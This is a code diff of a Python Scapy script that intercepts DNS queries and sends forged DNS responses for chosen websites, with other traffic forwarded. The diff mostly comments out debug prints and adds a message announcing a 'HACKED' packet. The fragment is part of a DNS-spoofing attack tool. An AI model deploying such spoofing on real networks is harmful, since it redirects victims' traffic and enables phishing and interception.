@@ -33,9 +33,9 @@ def dns_check(websites, dns, network, pkt, src_ip, dst_ip):
 
             if src_ip not in website[4]: #if we didn't already colelcted the information for this IP on this website
                 if pkt[DNS].qd.qtype == 1:
-                    print('-----------------------------------------------------------------------', flush=True)
-                    print("CREATE DNS RESPONSE , " + str(pkt[DNS][DNSQR].qname.decode('utf-8')) + ", " + str(pkt[DNS].qd.qtype) + " FROM " + str(pkt[Ether].src) + " TO " + str(pkt[Ether].dst), flush=True)
-                    print('-----------------------------------------------------------------------', flush=True)
+                    #print('-----------------------------------------------------------------------', flush=True)
+                    #print("CREATE DNS RESPONSE , " + str(pkt[DNS][DNSQR].qname.decode('utf-8')) + ", " + str(pkt[DNS].qd.qtype) + " FROM " + str(pkt[Ether].src) + " TO " + str(pkt[Ether].dst), flush=True)
+                    #print('-----------------------------------------------------------------------', flush=True)
                     create_dns_response(website, dns, network, pkt, src_ip, dst_ip, domain_name)        
                     return
                 else:
@@ -43,14 +43,14 @@ def dns_check(websites, dns, network, pkt, src_ip, dst_ip):
             else:
                 forward_dns(pkt,dst_ip) #if something is wrong, it will forward the package
         else:
-            print('-----------------------------------------------------------------------', flush=True)
-            print("FORWARD 1 , " + str(pkt[DNS][DNSQR].qname.decode('utf-8')) + ", " + str(pkt[DNS].qd.qtype) + " FROM " + str(pkt[Ether].src) + " TO " + str(pkt[Ether].dst), flush=True)
-            print('-----------------------------------------------------------------------', flush=True)
+            #print('-----------------------------------------------------------------------', flush=True)
+            #print("FORWARD 1 , " + str(pkt[DNS][DNSQR].qname.decode('utf-8')) + ", " + str(pkt[DNS].qd.qtype) + " FROM " + str(pkt[Ether].src) + " TO " + str(pkt[Ether].dst), flush=True)
+            #print('-----------------------------------------------------------------------', flush=True)
             forward_dns(pkt,dst_ip) #if something is wrong, it will forward the package
     else:
-        print('-----------------------------------------------------------------------', flush=True)
-        print("FORWARD 2, " + str(pkt[DNS][DNSQR].qname.decode('utf-8')) + ", " + str(pkt[DNS].qd.qtype) + " FROM " + str(pkt[Ether].src) + " TO " + str(pkt[Ether].dst), flush=True)
-        print('-----------------------------------------------------------------------', flush=True)
+        #print('-----------------------------------------------------------------------', flush=True)
+        #print("FORWARD 2, " + str(pkt[DNS][DNSQR].qname.decode('utf-8')) + ", " + str(pkt[DNS].qd.qtype) + " FROM " + str(pkt[Ether].src) + " TO " + str(pkt[Ether].dst), flush=True)
+        #print('-----------------------------------------------------------------------', flush=True)
         forward_dns(pkt,dst_ip) #if something is wrong, it will forward the package
 
 def remove_trailing_dot(s):
@@ -77,12 +77,12 @@ def forward_dns(pkt, dst_ip):
     if dst_MAC:
         pkt[Ether].dst = dst_MAC
         sendp(pkt)
-        if IP in pkt:
-            print("Forwarding package from" + str(pkt[IP].src) + " to " + str(pkt[IP].dst) + " for domain name "+ str(pkt[DNS][DNSQR].qname.decode('utf-8')) + " On a request " + str(pkt.getlayer(DNS).qd.qtype))
-        else :
-            print("Forwarding package")
-    else:
-        print(f"Error: Unable to resolve MAC address for {dst_ip}")
+    #    if IP in pkt:
+    #        print("Forwarding package from" + str(pkt[IP].src) + " to " + str(pkt[IP].dst) + " for domain name "+ str(pkt[DNS][DNSQR].qname.decode('utf-8')) + " On a request " + str(pkt.getlayer(DNS).qd.qtype))
+    #    else :
+    #        print("Forwarding package")
+    #else:
+    #    print(f"Error: Unable to resolve MAC address for {dst_ip}")
         #SINON AFFICHER QU'IL Y A UN PB
 
 
@@ -103,3 +103,4 @@ def create_dns_response(website, dns, network, pkt, req_src_ip, req_dst_ip, doma
     )
     fake_dns_response = fake_ether/fake_IP/fake_UDP/fake_DNS
     sendp(fake_dns_response, verbose=False)
+    print("Send an HACKED package at "+ str(fake_dns_response[IP].src) + " for domain name "+ str(fake_dns_response[DNS][DNSQR].qname.decode('utf-8')))
